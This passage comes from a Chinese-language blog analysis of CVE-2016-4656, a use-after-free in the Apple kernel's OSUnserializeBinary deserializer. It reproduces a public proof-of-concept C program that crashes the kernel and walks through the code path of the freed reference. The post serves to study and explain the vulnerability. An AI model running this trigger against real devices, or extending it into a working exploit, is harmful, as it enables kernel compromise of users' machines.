class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">        <span class="comment">//如果反序列化的结果不是一个reference</span></span><br><span class="line">	<span class="comment">//就将结果存放到objsCapacity之中</span></span><br><span class="line">	<span class="comment">//如果反序列化自后内存申请失败,则退出反序列化</span></span><br><span class="line">	<span class="keyword">if</span> (!isRef)</span><br><span class="line">	&#123;</span><br><span class="line">		setAtIndex(objs, objsIdx, o);</span><br><span class="line">		<span class="comment">//如果ok的值为false，则退出反序列化循环</span></span><br><span class="line">		</span><br><span class="line">		<span class="comment">//	#define kalloc_container(size)	\</span></span><br><span class="line">				kalloc_tag_bt(size, VM_KERN_MEMORY_LIBKERN)</span><br><span class="line">		<span class="comment">/*</span><br><span class="line">			typeof(objsArray) nbuf = (typeof(objsArray)) kalloc_container(ncap * sizeof(o));	</span><br><span class="line">			if (!nbuf) ok = false;</span><br><span class="line">		*/</span></span><br><span class="line">		</span><br><span class="line">		<span class="comment">//在内核中申请ncap*sizeof（o）大小的内存，如果申请失败的了则ok设为false</span></span><br><span class="line">		<span class="keyword">if</span> (!ok) &#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		objsIdx++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//如果存在一个解析出来的dict</span></span><br><span class="line">	<span class="keyword">if</span> (dict)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (sym)</span><br><span class="line">		&#123;</span><br><span class="line">			DEBG(<span class="string">"%s = %s\n"</span>, sym-&gt;getCStringNoCopy(), o-&gt;getMetaClass()-&gt;getClassName());</span><br><span class="line">			<span class="keyword">if</span> (o != dict) </span><br><span class="line">			&#123;</span><br><span class="line">				ok = dict-&gt;setObject(sym, o);</span><br><span class="line">			&#125;</span><br><span class="line">			o-&gt;release();</span><br><span class="line">			sym-&gt;release();</span><br><span class="line">			sym = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> </span><br><span class="line">		&#123;</span><br><span class="line">			sym = OSDynamicCast(OSSymbol, o);</span><br><span class="line">			<span class="keyword">if</span> (!sym &amp;&amp; (str = OSDynamicCast(OSString, o)))</span><br><span class="line">			&#123;</span><br><span class="line">			    sym = (OSSymbol *) OSSymbol::withString(str);</span><br><span class="line">			    o-&gt;release();</span><br><span class="line">			    o = <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			ok = (sym != <span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">array</span>) </span><br><span class="line">	&#123;</span><br><span class="line">		ok = <span class="built_in">array</span>-&gt;setObject(o);</span><br><span class="line">	    o-&gt;release();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">set</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	   ok = <span class="built_in">set</span>-&gt;setObject(o);</span><br><span class="line">	   o-&gt;release();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	    assert(!parent);</span><br><span class="line">	    result = o;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!ok) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (newCollect)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (!end)</span><br><span class="line">		&#123;</span><br><span class="line">			stackIdx++;</span><br><span class="line">			setAtIndex(<span class="built_in">stack</span>, stackIdx, parent);</span><br><span class="line">			<span class="keyword">if</span> (!ok) <span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		DEBG(<span class="string">"++stack[%d] %p\n"</span>, stackIdx, parent);</span><br><span class="line">		parent = o;</span><br><span class="line">		dict   = newDict;</span><br><span class="line">		<span class="built_in">array</span>  = newArray;</span><br><span class="line">		<span class="built_in">set</span>    = newSet;</span><br><span class="line">		end    = <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (end)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (!stackIdx) <span class="keyword">break</span>;</span><br><span class="line">		parent = stackArray[stackIdx];</span><br><span class="line">		DEBG(<span class="string">"--stack[%d] %p\n"</span>, stackIdx, parent);</span><br><span class="line">		stackIdx--;</span><br><span class="line">		<span class="built_in">set</span>   = <span class="number">0</span>; </span><br><span class="line">		dict  = <span class="number">0</span>; </span><br><span class="line">		<span class="built_in">array</span> = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">if</span> (!(dict = OSDynamicCast(OSDictionary, parent)))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (!(<span class="built_in">array</span> = OSDynamicCast(OSArray, parent))) ok = (<span class="number">0</span> != (<span class="built_in">set</span> = OSDynamicCast(OSSet, parent)));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对<code>reference</code>,<code>dict</code>,<code>set</code>,<code>array</code>都有相应的处理分支。</p>
<h1 id="0x02_POC的分析">0x02 POC的分析</h1><h2 id="2-1_POC">2.1 POC</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span><br><span class="line"> * Simple POC to trigger CVE-2016-4656 (C) Copyright 2016 Stefan Esser / SektionEins GmbH</span><br><span class="line"> * compile on OS X like:</span><br><span class="line"> *    gcc -arch i386 -framework IOKit -o ex exploit.c</span><br><span class="line"> */</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;mach/mach.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;IOKit/IOKitLib.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;IOKit/iokitmig.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span></span><br><span class="line">&#123;</span><br><span class="line">  kOSSerializeDictionary   = <span class="number">0x01000000</span>U,</span><br><span class="line">  kOSSerializeArray        = <span class="number">0x02000000</span>U,</span><br><span class="line">  kOSSerializeSet          = <span class="number">0x03000000</span>U,</span><br><span class="line">  kOSSerializeNumber       = <span class="number">0x04000000</span>U,</span><br><span class="line">  kOSSerializeSymbol       = <span class="number">0x08000000</span>U,</span><br><span class="line">  kOSSerializeString       = <span class="number">0x09000000</span>U,</span><br><span class="line">  kOSSerializeData         = <span class="number">0x0a000000</span>U,</span><br><span class="line">  kOSSerializeBoolean      = <span class="number">0x0b000000</span>U,</span><br><span class="line">  kOSSerializeObject       = <span class="number">0x0c000000</span>U,</span><br><span class="line">  kOSSerializeTypeMask     = <span class="number">0x7F000000</span>U,</span><br><span class="line">  kOSSerializeDataMask     = <span class="number">0x00FFFFFF</span>U,</span><br><span class="line">  kOSSerializeEndCollecton = <span class="number">0x80000000</span>U,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> kOSSerializeBinarySignature <span class="string">"\323\0\0"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> * data = <span class="built_in">malloc</span>(<span class="number">1024</span>);</span><br><span class="line">  <span class="keyword">uint32_t</span> * ptr = (<span class="keyword">uint32_t</span> *) data;</span><br><span class="line">  <span class="keyword">uint32_t</span> bufpos = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">mach_port_t</span> master = <span class="number">0</span>, res;</span><br><span class="line">  <span class="keyword">kern_return_t</span> kr;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* create header */</span></span><br><span class="line">  <span class="built_in">memcpy</span>(data, kOSSerializeBinarySignature, <span class="keyword">sizeof</span>(kOSSerializeBinarySignature));</span><br><span class="line">  bufpos += <span class="keyword">sizeof</span>(kOSSerializeBinarySignature);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* create a dictionary with 2 elements */</span></span><br><span class="line">  *(<span class="keyword">uint32_t</span> *)(data+bufpos) = kOSSerializeDictionary | kOSSerializeEndCollecton | <span class="number">2</span>; bufpos += <span class="number">4</span>;</span><br><span class="line">  <span class="comment">/* our key is a OSString object */</span></span><br><span class="line">  *(<span class="keyword">uint32_t</span> *)(data+bufpos) = kOSSerializeString | <span class="number">7</span>; bufpos += <span class="number">4</span>;</span><br><span class="line">  *(<span class="keyword">uint32_t</span> *)(data+bufpos) = <span class="number">0x41414141</span>; bufpos += <span class="number">4</span>;</span><br><span class="line">  *(<span class="keyword">uint32_t</span> *)(data+bufpos) = <span class="number">0x00414141</span>; bufpos += <span class="number">4</span>;</span><br><span class="line">  <span class="comment">/* our data is a simple boolean */</span></span><br><span class="line">  *(<span class="keyword">uint32_t</span> *)(data+bufpos) = kOSSerializeBoolean | <span class="number">64</span>; bufpos += <span class="number">4</span>;</span><br><span class="line">  <span class="comment">/* now create a reference to object 1 which is the OSString object that was just freed */</span></span><br><span class="line">  *(<span class="keyword">uint32_t</span> *)(data+bufpos) = kOSSerializeObject | <span class="number">1</span>; bufpos += <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* get a master port for IOKit API */</span></span><br><span class="line">  host_get_io_master(mach_host_self(), &amp;master);</span><br><span class="line">  <span class="comment">/* trigger the bug */</span></span><br><span class="line">  kr = io_service_get_matching_services_bin(master, data, bufpos, &amp;res);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"kr: 0x%x\n"</span>, kr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>很明显，<code>poc</code>创建了一个<code>dict</code>，这个<code>dict</code>有两个元素，第一个元素是<code>key</code>为<code>“AAAAAAA”</code>的字符串，值为一个<code>Boolean</code>。第二个元素是第一个元素的一个<code>reference</code>。</p>
<p>内核在反序列化这一段字符串的时候就会触发漏洞。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE-2016-4656/crash.png" alt="crash"></p>
<p>结合<code>OSUnserializeBinary</code>，来分析一下，到底发生了一些什么。</p>
<h2 id="2-2_流程">2.2 流程</h2><h3 id="2-2-1_kOSSerializeDictionary">2.2.1 kOSSerializeDictionary</h3><p>通过解析，二进制文件首先会进入<code>kOSSerializeDictionary</code>的分支。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> kOSSerializeDictionary:</span><br><span class="line">	o = newDict = OSDictionary::withCapacity(len);</span><br><span class="line">	newCollect = (len != <span class="number">0</span>);</span><br><span class="line">       <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<p><code>break</code>之后，执行<code>setAtIndex</code>宏。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objsArray[<span class="number">0</span>] = dict</span><br></pre></td></tr></table></figure>
<p>因为其他条件都不满足，代码会进入处理新容器的分支。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (newCollect)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (!end)</span><br><span class="line">	&#123;</span><br><span class="line">		stackIdx++;</span><br><span class="line">		setAtIndex(<span class="built_in">stack</span>, stackIdx, parent);</span><br><span class="line">		<span class="keyword">if</span> (!ok) <span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	DEBG(<span class="string">"++stack[%d] %p\n"</span>, stackIdx, parent);</span><br><span class="line">	parent = o;</span><br><span class="line">	dict   = newDict;</span><br><span class="line">	<span class="built_in">array</span>  = newArray;</span><br><span class="line">	<span class="built_in">set</span>    = newSet;</span><br><span class="line">	end    = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从而给<code>dict</code>赋值<code>newDict</code>。从而创建了一个<code>dict</code>用来存储后续的数据。</p>
<h3 id="2-2-2_kOSSerializeString与kOSSerializeBoolean">2.2.2 kOSSerializeString与kOSSerializeBoolean</h3><p>第一个元素的<code>key</code>是一个字符串，通过源码解析。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">case kOSSerializeString:</span><br><span class="line">				bufferPos += (wordLen * sizeof(uint32_t));</span><br><span class="line">				if (bufferPos &gt; bufferSize) break;</span><br><span class="line">		        o = OSString::withStringOfLength((const char *) next, len);</span><br><span class="line">		        next += wordLen;</span><br><span class="line">		        break;</span><br></pre></td></tr></table></figure>
<p>获得字符串<code>o</code>。</p>
<p><code>break</code>之后，执行<code>setAtIndex</code>宏。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">objsArray[<span class="number">0</span>] = dict</span><br><span class="line">objsArray[<span class="number">1</span>] = <span class="string">"0x0041414141414141"</span></span><br></pre></td></tr></table></figure>
<p>因为<code>dict</code>已经创建，进入<code>dict</code>的处理流程。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (dict)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (sym)</span><br><span class="line">			&#123;</span><br><span class="line">				DEBG(<span class="string">"%s = %s\n"</span>, sym-&gt;getCStringNoCopy(), o-&gt;getMetaClass()-&gt;getClassName());</span><br><span class="line">				<span class="keyword">if</span> (o != dict) </span><br><span class="line">				&#123;</span><br><span class="line">					ok = dict-&gt;setObject(sym, o);</span><br><span class="line">				&#125;</span><br><span class="line">				o-&gt;release();</span><br><span class="line">				sym-&gt;release();</span><br><span class="line">				sym = <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> </span><br><span class="line">			&#123;</span><br><span class="line">				sym = OSDynamicCast(OSSymbol, o);				<span class="comment">//&lt;--进入这个分支</span></span><br><span class="line">				<span class="keyword">if</span> (!sym &amp;&amp; (str = OSDynamicCast(OSString, o)))</span><br><span class="line">				&#123;</span><br><span class="line">				    sym = (OSSymbol *) OSSymbol::withString(str);</span><br><span class="line">				    o-&gt;release();</span><br><span class="line">				    o = <span class="number">0</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				ok = (sym != <span class="number">0</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
<p>因为<code>sym</code>并不存在，所以根据<code>o</code>转换出<code>sym</code>。</p>
<p>第一个元素的值是一个bool值，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> kOSSerializeBoolean:</span><br><span class="line">		o = (len ? kOSBooleanTrue : kOSBooleanFalse);</span><br><span class="line">        <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<p><code>break</code>之后，执行<code>setAtIndex</code>宏。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">objsArray[<span class="number">0</span>] =&gt; dict</span><br><span class="line">objsArray[<span class="number">1</span>] =&gt; <span class="string">"0x0041414141414141"</span></span><br><span class="line">objsArray[<span class="number">2</span>] =&gt; <span class="literal">true</span>	<span class="comment">//不知道是不是true，瞎写的，这里不重要</span></span><br></pre></td></tr></table></figure>
<p>再次进入<code>dict</code>的处理分支，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (dict)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (sym)<span class="comment">//&lt;--进入这个分支</span></span><br><span class="line">			&#123;</span><br><span class="line">				DEBG(<span class="string">"%s = %s\n"</span>, sym-&gt;getCStringNoCopy(), o-&gt;getMetaClass()-&gt;getClassName());</span><br><span class="line">				<span class="keyword">if</span> (o != dict) </span><br><span class="line">				&#123;</span><br><span class="line">					ok = dict-&gt;setObject(sym, o);</span><br><span class="line">				&#125;</span><br><span class="line">				o-&gt;release();	<span class="comment">//objsArrays[2]指向o</span></span><br><span class="line">				sym-&gt;release();	<span class="comment">//objsArrays[1]指向sym</span></span><br><span class="line">				sym = <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> </span><br><span class="line">			&#123;</span><br><span class="line">				sym = OSDynamicCast(OSSymbol, o);				</span><br><span class="line">				<span class="keyword">if</span> (!sym &amp;&amp; (str = OSDynamicCast(OSString, o)))</span><br><span class="line">				&#123;</span><br><span class="line">				    sym = (OSSymbol *) OSSymbol::withString(str);</span><br><span class="line">				    o-&gt;release();</span><br><span class="line">				    o = <span class="number">0</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				ok = (sym != <span class="number">0</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
<p>因为<code>sym</code>已经存在了，所以进入了上面的分支，在处理完成之后，对<code>o</code>和<code>sym</code>都进行了<code>release</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">objsArray[<span class="number">0</span>] =&gt; dict</span><br><span class="line">objsArray[<span class="number">1</span>] =&gt; <span class="string">"0x0041414141414141"</span>	<span class="comment">//released</span></span><br><span class="line">objsArray[<span class="number">2</span>] =&gt; <span class="literal">true</span>				   <span class="comment">//released</span></span><br></pre></td></tr></table></figure>
<h3 id="2-2-3_kOSSerializeObject">2.2.3 kOSSerializeObject</h3><p>第二个元素的是一个<code>reference</code>，处理的代码如下。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  <span class="keyword">case</span> kOSSerializeObject:</span><br><span class="line"><span class="keyword">if</span> (len &gt;= objsIdx) <span class="keyword">break</span>;</span><br><span class="line">o = objsArray[len];	<span class="comment">//len的值为1</span></span><br><span class="line">o-&gt;retain();</span><br><span class="line">isRef = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<p><code>o</code>取出数组中<code>objsArray[1]</code>,是一个已经被释放了的元素。</p>
<p>再通过<code>dict</code>处理的代码时</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//如果存在一个解析出来的dict</span></span><br><span class="line"><span class="keyword">if</span> (dict)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (sym)</span><br><span class="line">	&#123;</span><br><span class="line">		DEBG(<span class="string">"%s = %s\n"</span>, sym-&gt;getCStringNoCopy(), o-&gt;getMetaClass()-&gt;getClassName());</span><br><span class="line">		<span class="keyword">if</span> (o != dict) </span><br><span class="line">		&#123;</span><br><span class="line">			ok = dict-&gt;setObject(sym, o);</span><br><span class="line">		&#125;</span><br><span class="line">		o-&gt;release();</span><br><span class="line">		sym-&gt;release();</span><br><span class="line">		sym = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">		sym = OSDynamicCast(OSSymbol, o);</span><br><span class="line">		<span class="keyword">if</span> (!sym &amp;&amp; (str = OSDynamicCast(OSString, o)))</span><br><span class="line">		&#123;</span><br><span class="line">		    sym = (OSSymbol *) OSSymbol::withString(str);</span><br><span class="line">		    o-&gt;release();		<span class="comment">//再次调用o的release函数，出发UAF。</span></span><br><span class="line">		    o = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		ok = (sym != <span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x03_小结">0x03 小结</h1><p>​    这是今年在这个模块第二次出现<code>UAF</code>的漏洞了，在反序列化的流程中，将中间产生的元素存放在<code>objArrays</code>当中，在处理<code>reference</code>的时候进行使用，但是没有考虑到<code>reference</code>的流程中，会使用到已经被<code>free</code>的元素。</p>
<p>在过去的日常开发中，反思字节开发的序列化库，也确实经常会做类似的处理，默认了函数的输入都是合理的数据，并对序列化产生的数据进行了详细的测试，确保反序列化不会出问题，但是并没有考虑到恶意构造的二进制数据和序列化函数产生的二进制数据，在执行时可能会造成不同的流程。</p>
<h1 id="reference">reference</h1><p>1.PEGASUS iOS Kernel Vulnerability Explaine</p>
<p> <a href="https://sektioneins.de/en/blog/16-09-02-pegasus-ios-kernel-vulnerability-explained.html" target="_blank" rel="external">https://sektioneins.de/en/blog/16-09-02-pegasus-ios-kernel-vulnerability-explained.html</a></p>
<p>2.PEGASUS iOS Kernel Vulnerability Explained - Part 2</p>
<p><a href="https://sektioneins.de/en/blog/16-09-05-pegasus-ios-kernel-vulnerability-explained-part-2.html" target="_blank" rel="external">https://sektioneins.de/en/blog/16-09-05-pegasus-ios-kernel-vulnerability-explained-part-2.html</a></p>
<h1 id="附">附</h1><p>源码</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span 